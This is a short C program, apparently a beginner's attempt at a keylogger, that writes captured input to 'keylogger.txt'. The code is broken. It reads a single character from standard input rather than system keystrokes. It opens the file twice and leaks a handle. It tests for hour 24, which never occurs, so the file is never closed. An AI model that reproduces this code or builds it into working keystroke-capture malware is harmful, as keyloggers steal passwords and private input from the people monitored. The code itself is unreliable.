#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <ctype.h> // for isprint and isspace

int keylog()
{
    FILE * fPtr;
    fPtr = fopen("keylogger.txt", "w+");

    fopen("keylogger.txt", "w");
    int a = getchar();
    
    if(isprint(a) && !isspace(a)) {
        fprintf(fPtr, "%c", a);
    }
    
    time_t now = time(NULL);
    struct tm *tm_struct = localtime(&now);
    int hour = tm_struct->tm_hour;
    
    if(hour == 24)
        fclose(fPtr);
    return 0;
}

int main()
{
    keylog();
    return 0;
}